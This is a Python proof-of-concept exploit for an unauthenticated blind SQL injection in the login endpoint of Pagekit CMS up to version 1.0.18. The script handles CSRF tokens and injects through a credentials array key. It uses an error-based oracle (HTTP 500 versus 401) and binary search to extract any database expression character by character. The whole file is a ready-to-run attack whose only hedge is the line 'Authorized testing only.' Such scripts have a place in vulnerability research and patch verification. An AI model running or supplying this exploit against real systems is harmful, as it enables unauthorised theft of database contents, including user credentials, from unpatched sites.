#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pagekit CMS <= 1.0.18 unauthenticated SQL injection blind extraction PoC.
Target: POST /user/authenticate (credentials array key injected into WHERE).
Oracle: IF((cond),EXP(~0),1) -> true: MySQL error 1690 / HTTP 500, false: HTTP 401.
Usage:  python pagekit_sqli_dbname.py --url http://target
Authorized testing only.
"""

import argparse
import random
import re
import string
import sys
import time

import requests


def rand_user():
    return "u_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))


class PagekitBlind:
    FMT = "1=1 AND IF(({cond}),EXP(~0),1)"

    def __init__(self, url, delay=0.05):
        self.url = url.rstrip("/") + "/user/authenticate"
        self.delay = delay
        self.sess = requests.Session()
        self.csrf = None
        self.count = 0

    def token(self):
        r = self.sess.get(self.url.replace("/user/authenticate", "/user/login"))
        self.csrf = re.search(r'name="_csrf" value="([^"]+)"', r.text).group(1)

    def ask(self, cond):
        payload = self.FMT.format(cond=cond)
        for _ in range(2):
            self.count += 1
            data = {
                "credentials[username]": rand_user(),
                "credentials[0]": payload,
                "credentials[password]": "x",
                "_csrf": self.csrf or "",
            }
            r = self.sess.post(self.url, data=data,
                               headers={"X-Requested-With": "XMLHttpRequest"})
            if r.status_code == 401 and r.text.strip().startswith("{"):
                try:
                    self.csrf = r.json()["csrf"]
                    continue
                except ValueError:
                    pass
            return r.status_code == 500
        return False

    def length(self, expr, upper=64):
        lo, hi = 0, upper
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask("LENGTH(%s)>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
            time.sleep(self.delay)
        return lo

    def value(self, expr):
        n = self.length(expr)
        print("[*] length = %d" % n)
        out = ""
        for pos in range(1, n + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask("ASCII(SUBSTRING(%s,%d,1))>%d" % (expr, pos, mid)):
                    lo = mid + 1
                else:
                    hi = mid
                time.sleep(self.delay)
            out += chr(lo)
            print("[+] %s" % out)
        return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url")
    ap.add_argument("--expr", default="DATABASE()")
    ap.add_argument("--delay", type=float, default=0.05)
    args = ap.parse_args()

    b = PagekitBlind(args.url, args.delay)
    b.token()
    assert b.ask("1=1"), "oracle check failed (expected 500 on true)"
    assert not b.ask("1=2"), "oracle check failed (expected 401 on false)"
    print("[*] oracle OK (true=500 / false=401)")

    t0 = time.time()
    result = b.value(args.expr)
    print("-" * 40)
    print("[+] %s = %r" % (args.expr, result))
    print("[*] %d requests, %.1fs" % (b.count, time.time() - t0))


if __name__ == "__main__":
    main()
